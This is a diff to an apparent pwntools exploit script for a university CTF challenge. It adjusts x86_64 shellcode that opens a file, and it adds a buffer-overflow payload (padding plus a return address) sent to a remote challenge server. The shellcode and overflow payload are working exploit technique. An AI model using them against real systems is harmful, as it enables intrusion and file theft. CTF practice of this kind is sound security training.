@@ -15,6 +15,7 @@ for i in path:
         print('')
         segment = ''
 '''
+context.clear(arch='x86_64')
 
 # shlelcode
 shellcode = asm('''
@@ -24,6 +25,7 @@ shellcode = asm('''
     push rax
     mov rdi, rsp
     xor rsi, rsi
+    xor rdx, rdx
     mov rax, 2
     syscall
 
@@ -39,8 +41,7 @@ shellcode = asm('''
         ''')
 
 # send remote process
-context.clear(arch='x86_64')
 r = remote('edu-ctf.csie.org', 10171)
-r.recvuntil('>')
-r.sendline(shellcode)
+r.sendlineafter('>', shellcode)
+r.sendlineafter(':)', 'a' * 0x18 + p64(0x6010a0))
 r.interactive()
